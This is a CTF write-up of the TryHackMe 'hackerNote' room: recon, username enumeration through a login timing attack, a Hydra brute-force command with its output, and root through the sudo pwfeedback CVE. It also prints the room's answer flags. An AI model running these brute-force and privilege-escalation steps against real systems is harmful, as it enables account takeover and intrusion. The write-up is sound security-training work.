# hackerNote

A custom webapp, introducing username enumeration, custom wordlists and a basic privilege escalation exploit.

[hackerNote](https://tryhackme.com/room/hackernote)

## Topic's

- Network Enumeration
- Web Enumeration
- Username timing attack
- Brute Forcing (http-post-form)
- CVE-2019-18634 - Sudo 1.8.25p - 'pwfeedback' Buffer Overflow

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Reconnaissance

You're presented with a machine. Your first step should be recon. Scan the machine with nmap, work out what's running.

```
kali@kali:~/CTFs/tryhackme/hackerNote$ sudo nmap -A -sS -sC -sV -O 10.10.24.100
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 21:41 CET
Nmap scan report for 10.10.24.100
Host is up (0.040s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - hackerNote
8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Home - hackerNote
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/14%OT=22%CT=1%CU=32914%PV=Y%DS=2%DC=T%G=Y%TM=5FB041
OS:0B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   51.24 ms 10.8.0.1
2   51.23 ms 10.10.24.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.10 seconds
```

Which ports are open? (in numerical order)

`22,80,8080`

What programming language is the backend written in?

`Go`

## Task 2 Investigate

Now that you know what's running, you need to investigate. With webapps, the normal process is to click around. Create an account, use the web app as a user would and play close attention to details.

```
kali@kali:~/CTFs/tryhackme/hackerNote$ gobuster dir -u 10.10.24.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.24.100
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/14 21:41:52 Starting gobuster
===============================================================
/login (Status: 301)
/notes (Status: 301)
/http%3A%2F%2Fwww (Status: 301)
Progress: 29969 / 220561 (13.59%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/11/14 21:43:41 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/hackerNote$ gobuster dir -u http://10.10.24.100:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.24.100:8080
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/14 21:43:36 Starting gobuster
===============================================================
/login (Status: 301)
/notes (Status: 301)
Progress: 16928 / 220561 (7.67%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/11/14 21:44:39 Finished
===============================================================
```

[http://10.10.24.100/login/](http://10.10.24.100/login/)

[http://10.10.24.100/notes/](http://10.10.24.100/notes/)

[http://10.10.24.100:8080/login/](http://10.10.24.100:8080/login/)

[http://10.10.24.100:8080/notes/](http://10.10.24.100:8080/notes/)

[view-source:http://10.10.24.100/login/login.js](view-source:http://10.10.24.100/login/login.js)

```js
async function login() {
  const username = document.querySelector("#username").value;
  const password = document.querySelector("#password").value;
  const button = document.querySelector("#loginButton");
  button.disabled = true;
  document.querySelector("#status").textContent = "Logging you in...";
  const response = await postData("/api/user/login", {
    username: username,
    password: password,
  });
  console.log(response);
  if (response.status !== undefined && response.status !== "success") {
    document.querySelector("#status").textContent = "";
    document.querySelector("#errorMessage").textContent = response.status;
    button.disabled = false;
    return;
  }
  if (response.SessionToken !== undefined) {
    window.location = "/notes";
  }
}
async function forgotPassword() {
  //Based on username, find return password hint
  var username = document.querySelector("#username").value;
  const response = await getData("/api/user/passwordhint/" + username);
  console.log(response);
  if (response.hint !== undefined && response.hint !== "success") {
    document.querySelector("#passwordHint").textContent =
      "Hint: " + response.hint;
    return;
  }
}
function getCookie(name) {
  var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
  return v ? v[2] : null;
}
function onLoad() {
  const session = getCookie("SessionToken");
  console.log(session);
  if (session !== null && session !== "") {
    window.location = "/notes";
  }
}
async function createUser() {
  const button = document.querySelector("#userCreateButton");
  const username = document.querySelector("#usernameCreate").value;
  const password = document.querySelector("#passwordCreate").value;
  const passwordHint = document.querySelector("#passwordHintCreate").value;
  const user = {
    Username: username,
    Password: password,
    PasswordHint: passwordHint,
  };
  document.querySelector("#statusCreation").textContent =
    "Creating your account";
  button.disabled = true;
  const response = await postData("/api/user/create", user);
  console.log(response);
  if (response.status !== undefined) {
    if (response.status !== "success") {
      document.querySelector("#statusCreation").textContent = "";
      document.querySelector("#errorMessage").textContent = response.status;
      return;
    }
    document.querySelector("#statusCreation").textContent = "";
    document.querySelector("#statusCreation").textContent =
      "Successfully created a user account";
    document.querySelector("#usernameCreate").value = "";
    document.querySelector("#passwordCreate").value = "";
    document.querySelector("#passwordHintCreate").value = "";
    return;
  }
  document.querySelector("#statusCreation").textContent = "";
  document.querySelector("#errorMessage").textContent =
    "Something went wrong...";
}
```

```js
login();
const response = await postData("/api/user/login", {
  username: username,
  password: password,
});
```

```js
forgotPassword();
const response = await getData("/api/user/passwordhint/" + username);
```

```js
createUser();
const response = await postData("/api/user/create", user);
```

Create your own user account

`No answer needed`

Log in to your account

`No answer needed`

Try and log in to an invalid user account

`No answer needed`

Try and log in to your account, with an incorrect password.

`No answer needed`

Notice the timing difference. This allows user enumeration

`No answer needed`

## Task 3 Exploit

**Use the timing attack**

Now that we know there's a timing attack, we can write a python script to exploit it.

The first step is working out how login requests work. You can use Burpsuite for this, but I prefer to use Firefox dev tools as I don't have to configure any proxies.

Here we can see the login is a POST request to /api/user/login. This means we can make this request using CURL, python or another programming language of your choice.

![](https://i.imgur.com/swXlKKU.png)

In python, we can use this code and the Requests library to send this request as follows:

```py
creds = {"username":username,"password":"invalidPassword!"}
response = r.post(URL,json=creds)
```

The next stage is timing this. Using the "time" standard library, we can work out the time difference between when we send the request and when we get a response. I've moved the login request into it's own function called doLogin.

```py
startTime = time.time()
doLogin(user)
endTime = time.time()
```

The next step is now to repeat this for all usernames in the username list. This can be done with a series of for loops. The first will read usernames from a file into a list, and the second will test each of these usernames and see the time taken to respond. For my exploit, I decided that times within 10% of the largest time were likely to be valid usernames.

**Why does the time taken change?**

The backend is intentionally poorly written. The server will only try to verify the password of the user if it receives a correct username. The psuedocode to explain this better is below.

```py
def login(username, password):
    if username in users: ##If it's a valid username
        login_status = check_password(password) ##This takes a noticeable amount of time
        if login_status:
            return new_session_token()
        else:
            return "Username or password incorrect"
    else:
        return "Username or password incorrect"
```

Pre-written exploits in Golang and Python are available here: https://github.com/NinjaJc01/hackerNoteExploits

Use the Honeypot capture or Names/names.txt from https://github.com/danielmiessler/SecLists/tree/master/Usernames. The shorter the list is, the faster the exploit will complete. (Hint: one of those wordlists is shorter.)

NOTE: The Golang exploit is not reliable but it is faster. If you get invalid usernames, try re-running it after a minute or switching to the python exploit.

Try to write a script to perform a timing attack.

How many usernames from the list are valid?

```
kali@kali:~/CTFs/tryhackme/hackerNote$ python3 exploitAPI.py
Starting POST Requests
Finished POST requests
Time delta: 2.046557664871216 seconds (larger is better)
james is likely to be valid
```

`1`

What are/is the valid username(s)?

`james`

## Task 4 Attack Passwords

**Next Step**

Now that we have a username, we need a password. Because the passwords are hashed with bcrypt and take a noticeable time to verify, bruteforcing with a large wordlist like rockyou is not feasible.
Fortunately, this webapp has password hints!

With the username that we found in the last step, we can retrieve the password hint. From this password hint, we can create a wordlist and (more) efficiently bruteforce the user's password.

**Create your wordlist**

The password hint is "my favourite colour and my favourite number", so we can get a wordlist of colours and a wordlist of digits and combine them using Hashcat Util's Combinator which will give us every combination of the two wordlists. Using this wordlist, we can then use Hydra to attack the login API route and find the password for the user. Download the attached wordlist files, look at them then combine them using hashcat-util's combinator.
Hashcat utils can be downloaded from: https://github.com/hashcat/hashcat-utils/releases
Either add these to your PATH, or run them from the folder.
We want to use the Combinator.bin binary, with colors.txt and numbers.txt as the input. The command for this is (assuming you're in the directory with the binaries and have copiesd the txt files into that directory):

`./combinator.bin colors.txt numbers.txt > wordlist.txt`

This will then give you a wordlist to use for Hydra.

**Attack the API**

The HTTP POST request that we captured earlier tells us enough about the API that we can use Hydra to attack it.
The API is actually designed to either accept Form data, or JSON data. The frontend sends JSON data as a POST request, so we will use this. Hydra allows attacking HTTP POST requests, with the HTTP-POST module. To use this, we need:

- Request Body - JSON
  `{"username":"admin","password":"admin"}`
- Request Path -
  `/api/user/login`
- Error message for incorrect logins -
  `"Invalid Username Or Password"`

The command for this is (replace the parts with angle brackets, you will need to escape special characters):

`hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>`

Form the hydra command to attack the login API route

`No answer needed`

How many passwords were in your wordlist?

```
kali@kali:~/CTFs/tryhackme/hackerNote$ wc wordlist.txt
 180  180 1290 wordlist.txt
```

`180`

What was the user's password?

```
kali@kali:~/CTFs/tryhackme/hackerNote$ hydra -l james -P wordlist.txt 10.10.24.100 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-14 22:10:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
[DATA] attacking http-post-form://10.10.24.100:80/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password
[STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active
[80][http-post-form] host: 10.10.24.100   login: james   password: blue7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-14 22:12:03
```

`blue7`

Login as the user to the platform

`No answer needed`

What's the user's SSH password?

```
My SSH details

So that I don't forget, my SSH password is dak4ddb37b
```

`dak4ddb37b`

Log in as the user to SSH with the credentials you have.

`No answer needed`

What's the user flag?

```
james@hackernote:~$ cat user.txt
thm{56911bd7ba1371a3221478aa5c094d68}
```

`thm{56911bd7ba1371a3221478aa5c094d68}`

## Task 5 Escalate

**Enumeration of privileges**

Now that you have an SSH session, you can grab the user flag. But that shouldn't be enough for you, you need root.
A good first step for privilege escalation is seeing if you can run sudo. You have the password for the current user, so you can run the command:

`sudo -l`

This command tells you what commands you can run as the superuser with sudo. Unfortunately, the current user cannot run any commands as root. You may have noticed, however, that when you enter your password you see asterisks. This is not default behaviour. There was a recent CVE released that affects this configuration. The setting is called pwdfeedback.

```
james@hackernote:~$ sudo -l
[sudo] password for james: **********
```

What is the CVE number for the exploit?

`CVE-2019-18634`

Find the exploit from https://github.com/saleemrashid/ and download the files.

`No answer needed`

Compile the exploit from Kali linux.

`No answer needed`

SCP the exploit binary to the box.

`No answer needed`

Run the exploit, get root.

```
james@hackernote:~$ ls -la
total 928
drwxr-xr-x 4 james james   4096 Nov 14 21:21 .
drwxr-xr-x 4 root  root    4096 Feb  8  2020 ..
lrwxrwxrwx 1 james james      9 Feb 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james    220 Feb  8  2020 .bash_logout
-rw-r--r-- 1 james james   3771 Feb  8  2020 .bashrc
drwx------ 2 james james   4096 Feb  8  2020 .cache
-rwxr-xr-x 1 james james 916872 Nov 14 21:21 exploit
drwx------ 3 james james   4096 Feb  8  2020 .gnupg
-rw-r--r-- 1 james james    807 Feb  8  2020 .profile
-rw------- 1 james james     38 Feb  8  2020 user.txt
james@hackernote:~$ ./exploit
[sudo] password for james:
Sorry, try again.
# id
uid=0(root) gid=0(root) groups=0(root),1001(james)
# cat /root/root.txt
thm{af55ada6c2445446eb0606b5a2d3a4d2}
```

`No answer needed`

What is the root flag?

`thm{af55ada6c2445446eb0606b5a2d3a4d2}`

## Task 6 Comments on realism and Further Reading

**Web app**

This room was designed to be more realistic and less CTF focused. The logic behind the timing attack is mentioned in OWASP's authentication section, and a fairly similar timing attack existed on OpenSSH, allowing username enumeration. I've included links to this in the Further Reading section

Password hints in webapps are normally considered bad practice, but large companies still often include them. Adobe suffered a large databreach affecting users of Creative Cloud and decryption of the passwords was made much easier due to the password hints also included in the breach.

**Privilege Escalation**

The privilege escalation for this box is a real world CVE vulnerability, and affected the default configurations of sudo on macOS, Linux Mint and ElementaryOS.

**Further reading**

**Timing attacks on logins**

- https://seclists.org/fulldisclosure/2016/Jul/51
- https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/
- https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)

**Adobe Password Breach**

- https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/

**Sudo CVE**

- https://dylankatz.com/Analysis-of-CVE-2019-18634/
- https://nvd.nist.gov/vuln/detail/CVE-2019-18634
- https://tryhackme.com/room/sudovulnsbof

Read, explore, learn.
